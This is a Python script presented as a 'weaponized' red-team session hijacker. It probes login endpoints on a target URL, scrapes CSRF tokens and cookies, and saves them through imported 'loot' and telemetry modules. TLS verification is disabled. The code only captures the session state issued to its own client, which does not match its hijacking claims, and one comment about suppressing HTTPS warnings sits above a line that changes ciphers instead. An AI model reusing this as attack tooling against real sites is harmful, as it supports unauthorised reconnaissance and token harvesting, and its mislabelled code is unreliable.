#!/usr/bin/env python3
"""
SESSION_HIJACKER.PY — Advanced Session Seeding & Token Replay (Multi-Project Edition)
Weaponized Red-Team Module: Dynamic target resolution, multi-framework CSRF harvesting,
robust cookie-jar state synchronization, and centralized loot persistence.
"""
import sys
import json
import httpx
from bs4 import BeautifulSoup
from urllib.parse import urlsplit

# Import centralized framework loot exfiltration and telemetry
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof

# Suppress insecure HTTPS warnings if self-signed certs are used in pre-production
httpx._config.DEFAULT_CIPHERS += ":HIGH:!MEDIUM:!LOW:!NULL"

def exploit_session(target_url):
    """
    Harvests active session cookies, CSRF tokens, and transport state 
    dynamically for any provided pre-production target URL.
    """
    if not target_url:
        print("[-] Error: No target URL supplied to session hijacker.")
        return None, None

    # Normalize target URL dynamically
    formatted_url = target_url if "://" in target_url else f"https://{target_url}"
    parsed = urlsplit(formatted_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    
    # Check both standard login and auth entry points across frameworks
    target_entry_paths = ["/user/login", "/login", "/auth/login", "/api/auth/login"]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "X-Requested-With": "XMLHttpRequest"
    }

    with httpx.Client(verify=False, follow_redirects=True, timeout=10.0) as client:
        resp = None
        used_url = ""
        
        # Probe potential login/auth gateways dynamically
        for path in target_entry_paths:
            test_url = f"{base_url}{path}"
            try:
                resp = client.get(test_url, headers=headers)
                if resp.status_code < 400:
                    used_url = test_url
                    print(f"[+] Successfully established transport gate at: {used_url}")
                    break
            except Exception as e:
                continue

        if not resp or resp.status_code >= 400:
            print(f"[-] Failed to establish session handshake with {base_url}. Check target availability.")
            return None, None

        # Parse DOM to harvest CSRF tokens across Laravel (_token) or SPA meta tags
        soup = BeautifulSoup(resp.text, "html.parser")
        
        token_input = (
            soup.find("input", {"name": "_token"}) or 
            soup.find("input", {"name": "csrf_token"}) or
            soup.find("input", {"name": "authenticity_token"})
        )
        
        csrf_val = None
        if token_input:
            csrf_val = token_input.get("value")
        else:
            meta_token = soup.find("meta", {"name": "csrf-token"}) or soup.find("meta", {"name": "xsrf-token"})
            if meta_token:
                csrf_val = meta_token.get("content")

        captured_cookies = dict(client.cookies)
        
        if captured_cookies or csrf_val:
            print(f"[+] Captured Session Cookie Jar: {captured_cookies}")
            print(f"[+] Harvested Replay CSRF Token: {csrf_val if csrf_val else 'None (Stateless JWT / Header Auth)'}")
            
            # STREAM TELEMETRY & PERSIST HARVESTED SESSION SEED TO DISK
            harvest_data = {
                "base_url": base_url,
                "cookies": captured_cookies,
                "csrf_token": csrf_val,
                "gateway_url": used_url
            }
            stream_proof("SESSION_SEED_HARVESTED", used_url, {"headers": headers}, resp.text[:300], harvest_data)
            save_session_loot(
                target=base_url,
                endpoint=used_url,
                finding_type="SESSION_SEED_HARVESTED",
                status=resp.status_code,
                headers=dict(resp.headers),
                body=resp.text,
                extra_loot=harvest_data
            )

            return {
                "base_url": base_url,
                "cookies": captured_cookies,
                "csrf_token": csrf_val,
                "headers": headers
            }, csrf_val
        else:
            print("[-] Warning: Handshake completed but no session cookies or tokens were issued.")
            return None, None

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else None
    if not target:
        print("Usage: python3 session_hijacker.py <target_url>")
        sys.exit(1)
    exploit_session(target)
